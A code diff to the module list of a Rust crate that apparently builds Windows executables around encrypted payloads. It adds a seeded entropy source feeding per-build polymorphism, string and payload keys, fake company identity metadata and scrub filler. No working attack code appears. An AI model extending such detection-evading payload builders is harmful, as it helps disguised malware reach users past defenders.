@@ -22,6 +22,10 @@
 //! - `manifest`: the build manifest (provenance record written next to the
 //!   artifact).
 //! - `hash`: SHA-256 for provenance and payload pinning.
+//! - `entropy`: one seeded source for every per-build random value. All the
+//!   per-build choices (polymorphism seed, strings key, payload key and nonce,
+//!   icon seed, identity values and scrub filler) derive from it, so recording
+//!   one seed reproduces them.
 //! - `identity`: plausible randomized metadata (company, product, versions).
 //! - `resources`: PE resources (icon, `VERSIONINFO`, application manifest)
 //!   built in Rust and written into a `.rsrc` section.
@@ -37,6 +41,7 @@ pub mod build_lock;
 pub mod compiler;
 pub mod crypto;
 pub mod debug;
+pub mod entropy;
 pub mod entry;
 pub mod fetch;
 pub mod hash;
@@ -44,6 +49,7 @@ pub mod identity;
 pub mod imports;
 pub mod managed;
 pub mod manifest;
+pub(crate) mod mixer;
 pub mod obfuscation;
 pub mod pe;
 pub mod polymorphism;
